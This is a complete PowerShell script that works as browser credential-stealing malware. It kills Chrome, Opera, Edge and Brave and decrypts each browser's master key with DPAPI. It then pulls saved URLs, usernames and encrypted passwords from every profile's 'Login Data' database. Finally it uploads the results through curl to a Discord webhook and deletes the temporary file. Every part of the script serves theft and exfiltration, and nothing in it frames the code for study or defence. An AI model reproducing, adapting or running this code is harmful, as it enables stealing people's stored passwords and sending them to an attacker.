# class to interact with SQLite databases using
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinSQLite3
{
    const string dll = "winsqlite3";
    [DllImport(dll, EntryPoint="sqlite3_open")]
    public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
    [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
    public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
    [DllImport(dll, EntryPoint="sqlite3_step")]
    public static extern IntPtr Step(IntPtr stmt);
    [DllImport(dll, EntryPoint="sqlite3_column_text16")]
    static extern IntPtr ColumnText16(IntPtr stmt, int index);
    [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
    static extern int ColumnBytes(IntPtr stmt, int index);
    [DllImport(dll, EntryPoint="sqlite3_column_blob")]
    static extern IntPtr ColumnBlob(IntPtr stmt, int index);
    public static string ColumnString(IntPtr stmt, int index)
    { 
        return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
    }
    public static byte[] ColumnByteArray(IntPtr stmt, int index)
    {
        int length = ColumnBytes(stmt, index);
        byte[] result = new byte[length];
        if (length > 0)
            Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
        return result;
    }
    [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
    public static extern IntPtr Errmsg(IntPtr db);
    public static string GetErrmsg(IntPtr db)
    {
        return Marshal.PtrToStringUni(Errmsg(db));
    }
}
"@

Function generateFileName {
    # Generate a random string using characters from the specified ranges
    $fileName = -join ((48..57) + (65..90) + (97..122) | ForEach-Object { [char]$_ } | Get-Random -Count 5)
    return $fileName
}
function dumpChromium($browserName, $userDataPath) {
        
    # browserName = chrome, opera, name of process
    #pathName = \Google\Chrome\User Data, \Opera Software\Opera Stable
    $ErrorActionPreference = 'SilentlyContinue'
    try {
        Stop-Process -Name $browserName
        Add-Type -AssemblyName System.Security

        if ($browserName -eq "opera") {
            $browser_path = $env:APPDATA + $userDataPath
        }
        else {
            $browser_path = $env:LOCALAPPDATA + $userDataPath
        }
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"

        $secret = Get-Content -Raw -Path $( -join ($browser_path, "\Local State")) | ConvertFrom-Json
        $secretkey = $secret.os_crypt.encrypted_key

        $cipher = [Convert]::FromBase64String($secretkey)

        $key = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))



        $browser_profiles = Get-ChildItem -Path $browser_path | Where-Object { $_.Name -match "(Profile [0-9]|Default)" } | % { $_.FullName }


        $ex = ".tmp"
        $tempPath = $Env:TEMP
        $fileOut = generateFileName
        $fileOut = $fileOut + $ex
        $fullPath = $tempPath + "\" + $fileOut
        $records = @{}
        $i = 0
        foreach ($user_profile in $browser_profiles) {
            $dbH = 0
            if ([WinSQLite3]::Open($( -join ($user_profile, "\Login Data")), [ref] $dbH) -ne 0) {
                sendMessage("Failed to open!")
                [WinSQLite3]::GetErrmsg($dbh)
                
            }

            $stmt = 0
            if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
                sendMessage("Failed to prepare!")
                [WinSQLite3]::GetErrmsg($dbh)
               
            }

            while ([WinSQLite3]::Step($stmt) -eq 100) {
                
                try {
                    $url = [WinSQLite3]::ColumnString($stmt, 0)
                    $username = [WinSQLite3]::ColumnString($stmt, 1)
                    $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))

                    # Store the extracted data in a structured object
                    $record = @{
                        url      = $url
                        username = $username
                        password = $encryptedPassword
                        key      = $key
                    }
                    $i++
                    # Add record to the list
                    $jsonRecord = $record | ConvertTo-Json -Depth 10
                    $records.Add($i.ToString(), $jsonRecord)
                }
                catch {
                    sendMessage($_.Exception.Message)
                }

                
            }
 
        

        }

        try {
            $records | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullPath -Force
        }
        catch {
            $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
            sendMessage($message)
        }
        $browserM = (Get-Culture).TextInfo.ToTitleCase($browserName)
        $message = "Credentials from $browserM :"
        sendMessage($message)
        discordExfiltration -fileOut $fullPath
        removeFile -path $fullPath


    }
    catch [Exception] {
        sendMessage($_.Exception.Message)
    }


}

function sendMessage {
    param(
        $message
    )
    $payload = @{ content = $message } | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
}

function removeFile {
    param(
        $path
    )
    if (Test-Path $path) {
    
        Remove-Item -Path "$path" -Force
        $message = "File at $path deleted;);)"
        sendMessage($message)
    
    }
    else {
        $message = "I was not able to remove the file at $path....What happened?"
        sendMessage($message)
    }
        
}

function discordExfiltration {
    param(
        $fileOut
    )
    try {
        # Path to your JSON file
        $jsonFilePath = $fileOut
            
            
        # Ensure the file exists before sending it
        if (Test-Path $jsonFilePath) {
            # Webhook URL (replace this with your actual URL)
            try {
                $curlCommand = "curl.exe -s -X POST $hookUrl -F 'file=@$jsonFilePath' -H 'Content-Type: multipart/form-data'"
                Invoke-Expression $curlCommand | Out-Null
            }
            catch {
                $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
                sendMessage($message)
            }
    
                
        }
        else {
            $message = "The JSON file was not found. Please check the file path."
            sendMessage($message)
        }
    }
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
        sendMessage($message)
    }
        
}

$hookUrl = "https://discord.com/api/webhooks/XXXXXX"

dumpChromium "chrome" "\Google\Chrome\User Data"

dumpChromium "opera" "\Opera Software\Opera Stable"

dumpChromium "msedge" "\Microsoft\Edge\User Data"

dumpChromium "brave" "\BraveSoftware\Brave-Browser\User Data"
